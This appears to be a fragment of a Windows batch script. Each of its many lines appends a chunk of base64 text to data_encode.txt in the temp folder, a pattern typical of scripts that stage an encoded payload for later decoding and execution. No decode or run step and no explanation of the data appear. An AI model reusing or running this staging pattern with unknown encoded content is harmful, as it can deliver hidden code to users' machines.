echo gcjroqMRZoAg1TI7l6aOZEOCSOS29arJv3Jl89LUs3K7EbIpJxuzAlUZ8zfmBJgO >>%temp%\data_encode.txt 
echo PH940JNplexl5f5ML70cbZ9Lwngrs8fqLStl8ytdii0GRiPLM0l7OzUBGTPa+4yD >>%temp%\data_encode.txt 
echo 7QZpSlm5jsif7aXHmQC0+3FcfBPv3HVyG2YRT2Y7NUKSMVDI6S0dFM1mVvX873HM >>%temp%\data_encode.txt 
echo q5b/AceETRGOWWq8MMfMtkQ45kXzeI5x8xGOWWmMcMw0y/93OObar8/JMdcKF+aY >>%temp%\data_encode.txt 
echo 0Mkxjrkm6bwc897JeI7RR8ksHCXx0uJvj5ICajRDBxXUYcbbE8eWosIp6660ba/f >>%temp%\data_encode.txt 
echo JqJdRNMz8MPsAyuDrUb9h9d/BPaDi46bFQD6Mfz9REQjChf3S/jjDEbOZGJP1Zh0 >>%temp%\data_encode.txt 
echo 9aBc9gAtMINcP9KkideQapz9X6HVXoXqi1er5XHGeEK/yrFqke11G7TCZFAiDPv6 >>%temp%\data_encode.txt 
echo 1Il+S5dnUc4DBVwFqhXVyvIcLG+0g2D/2F9YjsxHPHOhnNNAncq7BwQ6tJzfAjI4 >>%temp%\data_encode.txt 
echo dSXM7tWpUlrL8gX1w98Xkxxt9cNFklnxzSUd5kqcFW50ecke+vBXqB1Dp9lDbwXn >>%temp%\data_encode.txt 
echo 1RgFSckTbFUBVC7SpXgWQVEEsjytjBSEFXeYFODagnuETocUhK3SkO6mQwD7KfZY >>%temp%\data_encode.txt 
echo v0GrFVj5tNq53lLA/PpXOF3dQ/u+hN+AO1zmpfej9asnU955FXDnKmxkeeNcTkpl >>%temp%\data_encode.txt 
echo SRfRkq9xWRxL9X0YooqkaYwZgI1jEA+eZBfI+BbBWHi1lAx14SpUmO8BGNxuhrp4 >>%temp%\data_encode.txt 
echo GFIulwR5deZQp2fB2sCPDC3JhaB1Dc//aJuhWvHl6AomtFSkUbBK9Hb5P1+ydoEW >>%temp%\data_encode.txt 
echo yYu0YpleTtvrrhG9pEAG2eOlU1mRPDlQpD/j0uHOtFWg+M3p9GTjlXFsTQqPfpM9 >>%temp%\data_encode.txt 
echo ETwtrpFmQ5cnh9mrRipZNBJcJQKiqqKLBUwGIl20DDcISDeuXPYZxPX48d2MX4fc >>%temp%\data_encode.txt 
echo x4vT6H/MiKkex6czaWc26FULbQbi4yUD48EwWTmi3qkH89Fg0QwdRV0CHOo4pOZ/ >>%temp%\data_encode.txt 
echo O9JiexdiL8UiqzP+NfIdCOZt210jv8aFo0gPh1i0EN00ZQPfpK1NHfpUPsANHZJ7 >>%temp%\data_encode.txt 
echo XMryTGzgugldnrnsutdJwBzykSEIDyx30eMqcFJXSlDiobk+letGBGYih8yPN99N >>%temp%\data_encode.txt 
echo KCunpi/xEtZy2tyPkx7ghiTI6yJ5Yw4nCsSzqD4nW7TqC1WdhmzNk4PVyQyU9TYe >>%temp%\data_encode.txt 
echo 64306TzG2mn03otidfdfGUz7XopV3nsGF59BVM/Hzywmte0y5aXdMNn6tZKklPNq >>%temp%\data_encode.txt 
echo OjiVJHXiavhdDQ5ziyejOQmbHfMNktJM0qHL3QkN76MZjFKa6ef8Ap0F82rcVbR3 >>%temp%\data_encode.txt 
echo FcwVdM0OdTdqxvBvSY6quUAucIZ8RpPMbPtnvPi4Ro2y6fQmqKZ354LAAPCychQj >>%temp%\data_encode.txt 
echo 9LfAj+oUFpETjaA1V+MKT7XiiQgUQxNO2yqmxyri+WlMf/VSFH8V0R0WwUcKrJvb >>%temp%\data_encode.txt 
echo qRV64MPlpdTohMgd3ft0a9sZuNMwlYTIXvnzJe2nLQ+O5pjy2F6EaiV7SQiCyDBE >>%temp%\data_encode.txt 
echo 1W+ax1VLF2ESGyZJfnB3jsnKAAcLrjaIaXRvRoyQ6dNi86HozsE+kkwKBGcBT9xW >>%temp%\data_encode.txt 
echo Ka3+MSsn8hqnmmRBI8YWl1WdqnHEqLkEYiRCi1toNoAPjyowLmAbUsQVKYZoBTV/ >>%temp%\data_encode.txt 
echo Pc9JuJ6cpsEsDu/WLb0BlQgQLLan22Ird3K/fWzZjjVQ/cY8TrwLeW+jj2xc5DgE >>%temp%\data_encode.txt 
echo 0sD2elJgkxHvLfP6LbiNHnCHvPRZdm9+GtTyFbnukHgZDo84K8RNS4TRx0g8W3ST >>%temp%\data_encode.txt 
echo sypHel29BOei6vQYXG2ODoMyr5UZRYwgh+Ea/PSXNK3nf4PI8LzvQuTq70bkkvFE >>%temp%\data_encode.txt 
echo ir+PIzK+/tMi9W8lJXgvtAFayc5V9n2fmTfp+5d1VvIxjJ2lxOQja/jcNYKUUr+e >>%temp%\data_encode.txt 
echo WYGIi9X589cIzqFHjWQIL8yDeXfPX0EwmGDmbcgmJsMagZiiwLwhR01xDolmYBTV >>%temp%\data_encode.txt 
echo aMiuwj1K+9hSOqlMI/t8yooR4mgalKz0lqm4kDtCQoqDVLLTNRbTB/LlHJpKlAw4 >>%temp%\data_encode.txt 
echo PxZvx9vKbNtN5H0v3XqWjaCXE3casyNJpimYvCRNMcg5V0qZUBf+JbSOQQG7JgG7 >>%temp%\data_encode.txt 
echo 2jTAfpOzckB6U/e5w9X6yh6MBYolbmld7s8h7plYQyvSFHc/rk+7B0BtUdyf4LL1 >>%temp%\data_encode.txt 
echo ihBoZoq7F4aYdPpUeqzv/GMKW9TqCTbtF48HkGqquLsDeOHnroD7E8W9N4BHO/4a >>%temp%\data_encode.txt 
echo cPcr7oO63Ue3UnIMfuCvRKOrj+HCLyNBkzI1aaYmZeh235Fd0+eOoeiZGbfmSd+a >>%temp%\data_encode.txt 
echo zvakBm2NuTgCTXUcIu8HfoJPlTj3ihNJnZCbK06Q263Obukb8gHaTk1CuMeEJs3W >>%temp%\data_encode.txt 
echo aEFrfc0spTjalArB1RdGbV4zoHGB1qeyu1t4drWfVfHw8mO8YGtCy6tAYVbA+5Bq >>%temp%\data_encode.txt 
echo UVYKcpvV2SENkiqh9d84ri3XsK5IvLEhNwBu8dqG3J/ib2ZD7s/wd1JDLtDVRoLS >>%temp%\data_encode.txt 
echo va04b1BXtuK9cWppq8zmwa0/wZ+bWnE2reY15P48guQXESSvGnUkrxkZklmtAQSc >>%temp%\data_encode.txt 
echo 0vpT/LG2NrFLoltbUOx7BK9fGLMfqlCqBNWu/ZCHUo6FEvdIBZSrzxY5Fwma7ZbG >>%temp%\data_encode.txt 
echo fxRwY8YpjcyEhPVw0u0wN+OZgyOXHOhuasMb92JgzWOWJj6ymEHvdiyOQu8G7uYd >>%temp%\data_encode.txt 
echo berEcSYxFVH5iu364t/RYCUODcgVPHUHSg/okH0zoZl88hkjiPwzBnEqzQRG80+t >>%temp%\data_encode.txt 
echo UrKpfxLuyfad5vBohc/NcTU8wL6zGTA5NOCOFtxDbj1cwO5RXfwSOPBEUhtMUnI4 >>%temp%\data_encode.txt 
echo yUw6FbTiwLNFpYGSEaVuoLS83Eu34WqIQZMGcIlwGm7theSdmayPvjgZoqzVSo66 >>%temp%\data_encode.txt 
echo UJdjI16oxQD/uBfEQYjWMqupNKBSmgrhxVv/cBiPNpChrdvQ8al6C3aLurDXR4/m >>%temp%\data_encode.txt 
echo s8MtFaCem6EnqpeTFWGyh3Tk3iAKARdfkJsjhUELTv0DozlMPlXSEYeX1sFgVQE4 >>%temp%\data_encode.txt 
echo fHQtukiwemwSC9IAqi3DRyR7uTybA+7vYlc6AgNDoQUlW24DfrYu7Gku0eqXXCal >>%temp%\data_encode.txt 
echo NvZsu8z2VHsR+NXFmgmtZlqSmi0eZvUyanunDablRfp1yda46KIW9yiO/y0lGqi2 >>%temp%\data_encode.txt 
echo r+VlgtI7QXoFz5B0emBsNNyGhl8tSbiojKZ6EQBzUUuSegoDX2Hi2trUA0QtkNt5 >>%temp%\data_encode.txt 
echo BaSdO03jYIIBnGIscrXY6ofvEofqhy+TroHRfwbLSbTWbzJcJpmK1BTwO/Y39tie >>%temp%\data_encode.txt 
echo cmv7qJpSDFnznZa7PEBkm3QScxbz6+s0ThIgb0feBPFaEEpzsACsdKxkyzyRkhXF >>%temp%\data_encode.txt 
echo FU0zFbHps46QA38fPjwExEI9A70m+VKOkRrb2sO9YoBYsjYXpAbAOfYPSXZn99or >>%temp%\data_encode.txt 
echo bX8ssbd/biSdQ3ud7bUzAvxEv8FL756K1hckRF+dqj9u06ka9Vu0NXaX/siIpm35 >>%temp%\data_encode.txt 
echo 1WF2U+5lueZnwCVm0Kn6AyMTaLV+q7yFgeCFxnI+ujgRj1ABx5cWgiQe8OhCUbfn >>%temp%\data_encode.txt 
echo yfLRKzn9Cmzmt2594TD2j62Y0M/R+YC8wkez8IfENphLS7EHOvb7ysmpFpOakZcv >>%temp%\data_encode.txt 
echo GgrJ7sBjsTOFezymky0WcB4LFBrQ/KQpHe+SB57WxIehT6m3kw8CP4yB7w4UGNB4 >>%temp%\data_encode.txt 
echo 63S+eD1WRHl67MTWgjJNAoZ+c0LU0ssFvcfPRfh1hCrp7L2BCtPBlimN+6WX1Enl >>%temp%\data_encode.txt 
echo 9Ar2fgZ9OB1VS4cGzu+lRwqwCm8G9eI/WpEaNSKM3BJ+CbGUk1HV6qWLADywiSdJ >>%temp%\data_encode.txt 
echo WDEhKH86s+moZPpwOcnHmoeS/IAk4csujkNl8M+vecvK6O+XYt9FmXBIXO43lNEn >>%temp%\data_encode.txt 
echo 02JFuR5t7cp8fk27HpPQH7NnDzMBxawyH827mePK6Bu419yF1ykjbulFYPlkH30h >>%temp%\data_encode.txt 
echo Da1Su7Xq6JSb7bVv5NVJqAlH5OYKoQIvDB6S1OqxTV62rew0Y6viWbtUjV2BGh/1 >>%temp%\data_encode.txt 
echo XCTq61EW1fcbUAxq/tzo4nYgD9AAnmz8EL1YaLoR930WIzrajqy9GJPT7eyW8uCW >>%temp%\data_encode.txt 
echo F3TeTKY+QMJYKdi37mzE/quU7XZCVc/vlNtM5Q6tnRpzJeuMQ0MHZh8UZxILNCc+ >>%temp%\data_encode.txt 
echo 3UC6owUagfIUOc9Ix8bkGDPTUKexm5Injo1XmCkWXrJKx/RzXtEi5uOF3uLsfNwb >>%temp%\data_encode.txt 
echo EWfm4yXeYjodtsZUk8IUHDFWVgZ3LDvKTHDbKoNa+h+8BdxWHB209G3ofAuc2wzB >>%temp%\data_encode.txt 
echo VpS5wVYUt2goVIOGQve+GDUexrVFZiT0jqu3gHuXQyM26VjD6FLwiWm5N4op5T46 >>%temp%\data_encode.txt 
echo 4EWuVCxArnrku1gXv4JYgWt3oI2c6wlDdBi0+nm0lQXtKGYuq+nmsvdqMWXJR6tt >>%temp%\data_encode.txt 
echo +iULIT+3kvwUd9cH2422p9pc8mlNdIDou04+jaYnp41QL0dSYvVyZTJT2dRp8pGz >>%temp%\data_encode.txt 
echo aHNoVFhiNUlOXf8R1AvU8ZadQNHmWFWj5Qua4qbTfx9Dc3QCQwPVi8B413xr9+F4 >>%temp%\data_encode.txt 
echo RWLX4TENgaKxITOSnTZeI8Bx2dHmiohDqPlmrHn6gm6iBR3clRS1244oGaBeOBYj >>%temp%\data_encode.txt 
echo 7gO74wy10hMZagWJdAxQuJNi88vKvidmRLT+UiBk7CEYehFoFRU9SEE3UrD6hXgj >>%temp%\data_encode.txt 
echo sTctccbjuGr3PzMS22lhj4pYa15C1CnjUN8dj3oR9z9F/YAlVjZgHNIOfANdkSsn >>%temp%\data_encode.txt 
echo 2agem6PP5pJucjFUHNnIOw6SWsERdoQO7Dmw+8AHzlFb07N4gOUUM55qHzU6Q+tg >>%temp%\data_encode.txt 
echo +ArkZcN83uTPrHaOPjrLz5eX0fuWo/BF0fyVjU288JRhj5Tl50FgQfzSWPzuuHhb >>%temp%\data_encode.txt 
echo Izugw/+JfAxRgUU7dHqY0RBMMDrnd4HMAIHhHJqxf2j/7L3iZFI3AByh5AZu5pma >>%temp%\data_encode.txt 
echo DaCgC7l4KO2jezWtTEmi/r1ofRQmKWSCYggUwTC0EkNSfOAv4OmtzIO2o+AVQNKa >>%temp%\data_encode.txt 
echo dBHbE60o0Jg+Llcq+4mJ5OCyBar+7HhFOiPufR+5HmtrE+/42nEaqmkPVia7FnsU >>%temp%\data_encode.txt 
echo ZhBM216BqqMiheUTPNTQHSTJ6R4Rv3Z0wHzrQDfpVqaB0hkVdyHIJ4IZ0XIkA4rj >>%temp%\data_encode.txt 
echo +PuBDxwdB7qdlWGlMkQq+yWz0z0g/pFIIYJ28urzkJmY6qP1E6OEVQAeTrGzr5fX >>%temp%\data_encode.txt 
echo f6B4MMmMzaAEdmyA3sluMhhTrP3GAE7lBkCm6Gb4IV2uRKbllrMxuQLjDjSqmfVs >>%temp%\data_encode.txt 
echo YnAWCFIqa7GoNZRjzDA8jeHsB5yI3vptE/9+XWaZGe4uM0pOFJz47MLe6ADUxWex >>%temp%\data_encode.txt 
echo ow340hCenaarhvENDLZayvq7jwpmfBzmxTOa5qNDJehefwrd/72X2cjiljz08eDb >>%temp%\data_encode.txt 
echo MTvM0hoXyHucW6IJwDYDW3vVFmdDIF0EvUhbvOgoHs9W9KBLWRAKfoVFUDsLeJUF >>%temp%\data_encode.txt 
echo YDDVrOw9MYWF6SYAkQFL7tGIJWRrF6T08ne5/QUcDAXJ2nX0Qyvq6zfqw3XN3X48 >>%temp%\data_encode.txt 
echo n/sAYHr5Vv2CCS1yz4U4OWKEK5rpH9P0uy7iwD+7Na4V9cWLhiOaNqTNbsfcX+4d >>%temp%\data_encode.txt 
echo CY2IWXjygB0deCQyANEBc3SudCOumHeqF6FFMsBNoLcCjGJRzbSQAetSV6ihKJge >>%temp%\data_encode.txt 
echo /S1InAkg1skaBL6YSaWxo8dJ+IzG2EMkdFXsrAaMQj4Ybybp2n0yzERADZ3WaeSo >>%temp%\data_encode.txt 
echo P0bJq3g5SCfkVk5Oz/+6hb+xOakIrSLYabtqYLmU5mTqRPDL1D2OQfUAPXorU38F >>%temp%\data_encode.txt 
echo /1Q6axkQO2hGg2KjeNm4t3qSKj6c5zfU4AMVkTc18K0xE31rt6btisj8IzDixfZj >>%temp%\data_encode.txt 
echo QDwuy7KyKyTuykobCqLeI3rnv6+fvxOn2bbzk24wSsWA/YZCWTXULhrsMEl9AX7S >>%temp%\data_encode.txt 
echo HA3kWv4IfNb9nfCTnEbpgKzytWmBbdro6KjcwQ/tnd35cj38E/dBxa6KO5cXVe9A >>%temp%\data_encode.txt 
echo aONWBzQpTH6g1nDBN932+sLV2IirnQuApTqMeBTvc9vrRtvrE+a3M43HV/4uPTzu >>%temp%\data_encode.txt 
echo SoHJE1nlZGjmnN7ofQINo/g+FbtSAF/PmYUygN0qELW+zjAjljgjaehkmHzsugHs >>%temp%\data_encode.txt 
echo mLHrBhjm+OsG/gWPOGZsXaof0/FBv5JGiMueu0bYYMO5Mv0DPilcN2KA2cqgB1ig >>%temp%\data_encode.txt 
echo J2ouPdc03lxa0Mr1k0TNz0Bn9nsDTb2RV1G6t4Ouqj+Ukn1WD3ptO5ox9zJD+Qyl >>%temp%\data_encode.txt 
echo 6eAIejFSYS+RKE297AGVT9gDKgfZAyp/ZQ+o7GUPqOzSH1AJ6w+o9OsPqHTrD6js >>%temp%\data_encode.txt 
echo 1B9QadMfUHlLf0AlFH1AhUYfUBlgD6hglpEHVJSmYwzIqjC60NCz6dhIJFk/Hp6N >>%temp%\data_encode.txt 
echo vJtCwpEXUhjZY4+k4BK6DetBr4aG3+CGDFpBV9Nf/nxMQoNuldcbp1u9oj/+M49s >>%temp%\data_encode.txt 
echo uwtqFOc731pDG+vEIDCBoSA6qk0BmGMxYoOBCeAP7I7eOiC9TydhB49OqvRjC2nB >>%temp%\data_encode.txt 
echo cZ3PDJ3P5ze8M43n2nx+I52tnzXyjTufFZ1b0v9GYVS8TCkZCZSMlHppyMJUr4oK >>%temp%\data_encode.txt 
echo wsVG5swxhkDr4ZJe+usP2VVmoNRumNJwGl9N25RC3McIh4cuVBEnHsfI39vPCLbt >>%temp%\data_encode.txt 
echo H5QTi0NbnZtXXGd39DRXhvzG5hUnm0u+XqmmgH9FyNHWXHLS5TcoJQOrlRLQsAe0 >>%temp%\data_encode.txt 
echo WqGUjYEB9zGcoHawVwtn4rwf2iPH3Q/izN0bOfICmsQ02+vugdlua31dPwdRJb0R >>%temp%\data_encode.txt 
echo u1b9McOTm+PHUUeb0/re3WtginCFSw5f/ejJQMGXcnjSOrM/FWYlgYalGr5KWeHs >>%temp%\data_encode.txt 
echo ntE2u11uE6BB+ffuWxPXsuzKlRKhVBHo73GEJCEWpGRDI9Lt+r6ppXUAaiyI1wHR >>%temp%\data_encode.txt 
echo rdGgkB5kZ4cT3wTZ/v/8OjqXOXEmeuDBbQVVBBi3OKR9p9OQZzElYixGjEtjGJ/9 >>%temp%\data_encode.txt 
echo NsbiYhgGMkCFgKHRINkahnFoFJNK6WvmsROM583q59GsajCrj38VzWphNCu/nhme >>%temp%\data_encode.txt 
echo WjTGvUp3XqT5UaRzEWljDOk/To8dASEFPGIlBgj/i+G7Yj56OqZ96LchOXoK/Dcp >>%temp%\data_encode.txt 
echo xWi33MW5HsAHrgSl2csuyBIq/OYuVzHWCXhWK8UPsZ/mR3GvvARpkp9bhmMRU68i >>%temp%\data_encode.txt 
echo OlW/rlOFmF5FL8dHSqMKHejfqHyFV+JjLKjY9Y8pdraxCaPM9A2UKxM5/cjgFTxT >>%temp%\data_encode.txt 
echo L+JWFEBTJELDMBIsJpdSi36VWYW2Jo+9x4fVtQY4KOpcRI9FnTn046hzLt0ddV5F >>%temp%\data_encode.txt 
echo g1Gni7ZGnUvpKxHntrvBQX+LJ052Zo0VyJxIR8VHsLCoY2qsfmVUKAIS9tJdY2os >>%temp%\data_encode.txt 
echo 0842LuPEuVrtMlqOFwV5llU4mRYqpuWjIiqmyuutnJTkpT+4EReRcMF/WRXeT+Ol >>%temp%\data_encode.txt 
echo h/Px6iJ9VUi//IaEtoQjV/7M9LKnJkm4SRNTZE2T1jsOkTOqyAD8mpe9Rgl4+mru >>%temp%\data_encode.txt 
echo M7H3I+8xRtfIpGnsViIEpKkWXBd6HtlXbSuPBOJLldCDJ42BfQ4h5epHNUh5Of0V >>%temp%\data_encode.txt 
echo G/7oQ/r5SPKpT7/GaOjTGdrsM6KFrYQFKd5guouR40OCM7z0HnNk/o0X/ojr1Ydj >>%temp%\data_encode.txt 
echo xD7OchTvjxL7qiG6riWleyM03Mt08CHsD2qeLxJYopNqiwLlI5D6MSPUR0+woZsG >>%temp%\data_encode.txt 
echo dYUMV1Zh6A/SyweZWnaOan2TP1+1fsKPr9ZkQ6JqRbFYRm81jKvWLfy3q/VnfHy1 >>%temp%\data_encode.txt 
echo FujUphsSVateqTVHn3Jx9DeQ9dYIxfoldtfiwnGbNAFmUSgXVBVvh4qWKdVLX0Lu >>%temp%\data_encode.txt 
echo TsUALWqqCMxpJZYIM04DAb8FF16a2NFGKYleeSPq6LGDK1HgowmBn73qW8DsxiB/ >>%temp%\data_encode.txt 
echo r2P/yqFBp9v66CLbH1H3l6Z51DQ6+yskVsz00fvAhasv6T6/oC1eeRQXxF7Vx/WP >>%temp%\data_encode.txt 
echo 1VT6J5iH6aekxtapmQS5GiSHn4umaNUVlwyYpeI10CG9Ub10OAzYGVk1/I/xWin8 >>%temp%\data_encode.txt 
echo oAsqeTqrZHuwZiYGpuEHXdCgGheJuQsD78APuvxp9J/RGBEDH8IPumBq8EEkZuxE >>%temp%\data_encode.txt 
echo RJ3Qhzaw5JIA/2wx1DDJBmUC77pKYbN3tu9WR2Y+21wbu++qLO7mKu/YZVeLIzdd >>%temp%\data_encode.txt 
echo ldElA1FL60shLPQjDJsfC0v1+WIYVKNjEM9j4PpHt/aEQZ3KDrk8YYi7+Arip+hX >>%temp%\data_encode.txt 
echo Y9maVoxtxMFEbSgqicvKAzObfoXUmzbrk395j0bed+zF3bX3nR+x3bVSmHTxpEO9 >>%temp%\data_encode.txt 
echo 2Re5KWso+qjkrLGbsvSj6T563bsQ94QJMpnOdCx/ptx7ScX87gN7HOw6giecbCUh >>%temp%\data_encode.txt 
echo ykg1T2IlN+MHXf6Z9J64m7QmMa3Sfzo2OTS3zjFybZHlaR+1sGuoxt9dhU8xuqKT >>%temp%\data_encode.txt 
echo Zzp6NgJxhSbNRT00K+H2byyDb8fph9txiIZyvsXusurIipwSq1mEZF/14+gtYCb6 >>%temp%\data_encode.txt 
echo u7hrsWzjNGK8UateT85Hk+dhSobjJf1WrdVxySd/6xKxDrwHUZuD14FFki/FlAwH >>%temp%\data_encode.txt 
echo uw3MTK+4cPLGseTLMCXDwW4Es1B6dtydXlilYxVThSYniKF5DAPrOQwNuxVsMn3x >>%temp%\data_encode.txt 
echo 7P/sVrDo6T8f/eHI/0YzoRyBZmob30z0mijyyd8ulcomQIGb8OAbFnAHWu60Yn9w >>%temp%\data_encode.txt 
echo 7Hd2R9aGZvTIRw7L7ZcVKtkBF+/cJw3GJqnsEtErfO9g/5dv5ES7fKOG11fq/U++ >>%temp%\data_encode.txt 
echo HE8UN4wiPqm3it0waq9pRq3w4Z9GVp4F2hmK6pqmKkXqdbKD1GKFfiCa3wa97Bbd >>%temp%\data_encode.txt 
echo xiT1JYM4NXKEeRv9MRKNst+kuY9FgceOMsfgXkadkfnkrG2cR30mqmhOYSvSx/7l >>%temp%\data_encode.txt 
echo nWSBbghFFNiXkNRgIKrAnu6IKrDQGLU8sUDYKqa84g00xCPgzvdEvH0ECd5Hgd6Z >>%temp%\data_encode.txt 
echo DAivjGS0JhEP2jdZiMcqC9p3UXn/vYPRclVNN9JyfYyWzSeitLCz2uwAe2Dm46TO >>%temp%\data_encode.txt 
echo qkh/dZ4Sb8PtoF7tei/dwUUovJ6UC+Q2niQF6nqVup0KGojsUlbshYmXgiYkB/Fu >>%temp%\data_encode.txt 
echo iIB7J/wd9AZKjtPT2J/qrLjR8p/fhdalJ+LU80x8mxbURXZ2EbdYeplOeQy0SD/8 >>%temp%\data_encode.txt 
echo Ul2x7NcVy15d307H84zAUsQdlkzEPdATvzVyCSm2bkaTROSDyaU0Tb9GpRF0AtAp >>%temp%\data_encode.txt 
echo NQ4P9yKLRZNkmfKMkmXQLQDAkFvAESj+FHDECq488EMrmbqZdDDwosGONrGQ5ML0 >>%temp%\data_encode.txt 
echo ZH5YMeDTnE3axgXl3lJ6BPilwksvu4WpLs6wmOK3rwxNsOAWz2Ri2axbNlv8Z1eG >>%temp%\data_encode.txt 
echo LrXEbaHpqoI0wUeP4qihXuujmzSmE0iXAhtAuhQsD4zsU/D40/sFsfs39fV0XDg0 >>%temp%\data_encode.txt 
echo 0N+PxqqW7eAFNlpJUqRPzGEuC5piA1fS1iEAbX0XEoQuTXK0KR5esSgeIUaQ3F8c >>%temp%\data_encode.txt 
echo cLdCN7kDuslque4Lztb4S7zoiFT2Nx3Sl919xBG4iTd1wojeymVynDO0wUhCPvoL >>%temp%\data_encode.txt 
echo 0IK2ZIJKUuEMbYSQcgdu5oNOP0IEvFJjqTw8Ki5pueMSfrDDIF432CFIKaVa+s7I >>%temp%\data_encode.txt 
echo bS6ki+yRe5e0D1se3JsDiUxpAXa/AacUZrQsvYRvLpwLoUX6zrRzVPrPyGYCvhqq >>%temp%\data_encode.txt 
echo xSUO5ZgWsZTyxgxNtMJ3VLTUL59brz5Gujo9cxtkirKIGkANpwb/gGrxf6Ma/YMr >>%temp%\data_encode.txt 
echo odQvoPw+iBefpjYdEieU6dThxhhQONO2vU2pypDDwDmAz6XOk8MmKQucgnoxBnR5 >>%temp%\data_encode.txt 
echo MrAbMHkC8MmEb+1ysbsYimTNZGsqBxdqsX5rDcUO+7gCCm8S/UyFNnHgi/ZK5UgZ >>%temp%\data_encode.txt 
echo XTY/8mo29UNSOgMS/cUAkfG7bC3Bb0umlsrjgOpTVecEn2OQPI51gHfBeulONEt8 >>%temp%\data_encode.txt 
echo Ef1cBRO6uM306D/GL6OP9q7Ljqqo9UejKmr70ZiKyiVQUSee+FcVlV1RbScrrIpd >>%temp%\data_encode.txt 
echo KcarSIzKpOgCJZr32EtLyU59yAKW1m/iAJV08o7IfRsxQyQ0CURrMVRWSaUd+W8i >>%temp%\data_encode.txt 
echo OOuXcFI66/a2Rivet9uzWhH6jAZ25XZaoCREv3gDJeFAw3qh7ywo6JfWZAHdZXj/ >>%temp%\data_encode.txt 
echo Df3TzbpZkf3/AkjlobMLTQCAQ0utvQ18VEWWKN4fN0kn6XBbCBg1SjTgoBEHbVDi >>%temp%\data_encode.txt 
echo BUmADlGJdsikGwYDzqxmee04zyF9AyohiTetuSnuDLsr+3RHZnSVXVwYh1G+1EG6 >>%temp%\data_encode.txt 
echo E00nwED4GAgGMCijFRs1SEwaiLnvnKrbnQ4ys7P/9+f3I31v3apTp05VnTqn6pxT >>%temp%\data_encode.txt 
echo gX5R3YROVniZmLJzI5ISwOLJiz9Z3J5SqZqd/UU9jWwPoM8NKW466j4+/4ALyH0s >>%temp%\data_encode.txt 
echo zMgt0hJh1Q+cwXyXTVwXdOPqWS14fal6tY3W5EJVkO+DLOjNdMi4fEpdrdnkv5VU >>%temp%\data_encode.txt 
echo CxFnrIyzH0sBtkUeLPekjbpyWSBjKDSKvvkl0hetSJT9wP0G2X5Xb2y/q3VJxKFM >>%temp%\data_encode.txt 
echo xMaZlImT8Ad4S+wcirn+G/Z7b/B4psOhozhp5bH5NY5qB2ehlhunO4M97/LJboPh >>%temp%\data_encode.txt 
echo b1XS9foaBxoie6pBbQFU+DHCEzDKejS2gZGllVD6zDtI7rMw5opt9RcYyW9Deys5 >>%temp%\data_encode.txt 
echo 6hZ3uDLdXlUepFX3cSUUvZmtSlRYPYseRNvuKZG78rcg9eWHK4kr8x3UPyqlUPXd >>%temp%\data_encode.txt 
echo oIGOzpcd1RnQDI+X3vcKGyj0ZSjkuxXQqKvpY9Sgw9RYvLS9BYqlYLGHG1Ogro/C >>%temp%\data_encode.txt 
echo VmZ/fkhzDQIWaC3m0FyZXp/Z7Sml3ptiNiIZ+fKg/BoUeEO1RjbEtI+n5bWXYdHy >>%temp%\data_encode.txt 
echo W47FOMTiJiTGI18AMZ7UDTOMV/GSXI9XiSatehomFTmKS+Qn4305C/OaBz667lBu >>%temp%\data_encode.txt 
echo h3SxykKOafY7Sat0zp8GUoE/qUAKyf2kLW+/tEcMdOBJ8EXSpnzebY1+eO7rdins >>%temp%\data_encode.txt 
echo H/Pht37zh98dC2J8FyWUIx2Qv4R1zdoaSa7LBwCFUpvcn7f/w+iKnn9ijlHmVcuH >>%temp%\data_encode.txt 
echo qxdhMfo7q5fLedW9orfdGoWax4kOc6XoD1WKscodUPkXV6g8ci0aQuzBL81SB4Ae >>%temp%\data_encode.txt 
echo /rZnKQnFuMMwhcQ1O/jWan/I7L8RtxLPaZmF0jd4uURlPrLnkAUw6svb3+Nj0UJH >>%temp%\data_encode.txt 
echo EhIKHPxCaobmdEBTtRmlzqA04LfHSx7AkgcvIEkn84hX2owH85qV7m5rCMmq2Ysi >>%temp%\data_encode.txt 
echo 4offyilxuoZzpAuMrvBJusDRSAFgYQuk95EDCA5JfIqTWFyzdRj/HwzjLzbcz/RJ >>%temp%\data_encode.txt 
echo wERsQGdt3o7eHieOkoMj++PvboX8eKwF0DVKd681hA0YLTpSKkV5uHvCDsD1i7/e >>%temp%\data_encode.txt 
echo hp43h/itJNhR2tTZ0tER5N4P1e05eCGhv9hGqsf7vo4xaKYTt4CeDpnskmmJfEPC >>%temp%\data_encode.txt 
echo 9Z/pumhKb5WtBZHbdppAkpIOokOIdKEqA6pMlXrlJJ+wMOLI7Ujf4xd8lsh5nzXy >>%temp%\data_encode.txt 
echo 9Ug7ojJxd0UmWn2TvV6o5GhuuYOEc132+k8QOC35jQmUAXFHcBFwhhWVVejM9lMM >>%temp%\data_encode.txt 
echo x1NA9lLHbzAOv64c0nPDuUd5ifRmuQCkl8wp/pvEzQMANbfGHvpKAJiyAxGGphyl >>%temp%\data_encode.txt 
echo A+thIW2LOJzt9Z+ZTL21JJTe6rf8wVx32twUQk+E4SgPylngjcAzswP6UxaC1h2y >>%temp%\data_encode.txt 
echo XStpA3WsMZmu2qrr2rz0fJdjRSb97nNkDEvV6XQe1NOzHXcdK2zkAYGEyBgg3ESk >>%temp%\data_encode.txt 
echo 40z8I5fp8m1OXDMmuL1xdc1TRl9iO5XKB5OA99hak009v4AE32Me6vmNsfyMbirJ >>%temp%\data_encode.txt 
echo qTtnDp5Oqgu5G22tBVaTU++534L8X2qrzQDqd1SltCZPLoKKm1w5msc81Rx29elW >>%temp%\data_encode.txt 
echo 9MDX609jc0GaCXUnKcEUtRzk+zPOYHrIN2WhfENjMpkjkPSJjI5tcpJa0hcZBYWH >>%temp%\data_encode.txt 
echo 0D7J2pp8h7NdW24G5o6xcYBQGcS1Lx4kxNRogdKsLMjvK2z56eJzOMt9U8hB0DVE >>%temp%\data_encode.txt 
echo E9tVRkP2syA7u4k1t5mUCbkHSUmU95y4u50ueRkLLKq0hqDLlWh+tdUKqlh5Lyk5 >>%temp%\data_encode.txt 
echo K27eIzQmF4EOEOoRFCo8xGEB0MpA8KnNgBX8riwGyrpLF5RRvN8ZZArQb6b5pmhF >>%temp%\data_encode.txt 
echo +uImW92FSn9S3YUiOakxqzjyNXSO5DrhH1N3IR/4ZcmZutA9EctQqNEWsQ4V6IDj >>%temp%\data_encode.txt 
echo GC9Qxe2h7S8xzm8dgDqI6wS3Y+6FlyaX/oepGD/HDZSzQmvob36NLnKwHLqi9aex >>%temp%\data_encode.txt 
echo q/NK+q7r19wWoPTKtFoQiZYLb+dF0gaO+yYrR00DpxY3LjSTi1BPI0iaIE5Peo8C >>%temp%\data_encode.txt 
